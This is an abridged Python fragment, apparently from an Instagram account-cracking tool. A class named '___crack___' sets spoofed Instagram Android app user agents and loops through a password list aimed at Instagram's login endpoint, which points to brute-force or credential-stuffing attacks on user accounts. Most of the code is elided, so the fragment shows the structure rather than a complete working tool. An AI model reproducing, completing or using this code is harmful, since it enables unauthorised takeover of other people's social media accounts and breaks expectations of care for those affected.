...
class ___crack___:
    ...
    def __main__(self, user, uid, pwx):
        try:
            ...
            ___useragent = ___roz('Mozilla/5.0 (Linux; Android 12; SM-S908U1 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 Instagram 243.0.0.16.111 Android (31/12; 420dpi; 1080x2115; samsung; SM-S908U1; b0q; qcom; en_US; 382290489')
            ___useragent = ___roz('Mozilla/5.0 (Linux; Android 11; GM1915 Build/RKQ1.201022.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 Instagram 245.0.0.18.108 Android (30/11; 600dpi; 1440x2910; OnePlus; GM1915; OnePlus7ProTMO; qcom; en_US; 385415781')
        ...
        try:
            for pw in pwx:
                ...
                ___login = ('https://z-p15.www.instagram.com/accounts/login/ajax/')
